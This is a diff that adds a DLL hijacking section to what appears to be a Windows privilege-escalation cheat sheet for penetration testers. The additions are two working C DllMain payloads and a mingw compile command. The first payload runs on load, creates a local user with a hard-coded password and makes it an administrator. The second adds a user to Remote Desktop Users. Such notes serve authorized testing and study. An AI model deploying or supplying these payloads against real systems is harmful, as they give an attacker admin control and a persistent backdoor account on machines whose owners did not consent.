@@ -9288,6 +9288,35 @@ Get-LocalGroupMember administrators
 ###### DLL Hijacking process
 Winpeas, Installed Applications --Via Program Files registry --
 
+Create user and add to admins 
+```c
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    if (dwReason == DLL_PROCESS_ATTACH){
+        system("cmd.exe /C net user secconsult P@ssW0rd1sSup3rS6curE /add /Y");
+        system("cmd.exe /C net localgroup administrators secconsult /add");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+Add to remote desktop users
+
+```c
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    if (dwReason == DLL_PROCESS_ATTACH){
+        system("cmd.exe /C net localgroup \"Remote Desktop Users\" henrial /add");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+```c
+x86_64-w64-mingw32-gcc dll_hijacking.c -shared -o dll_hijacking.dll
+```
 
 List non standard windows services with auto start mode
 
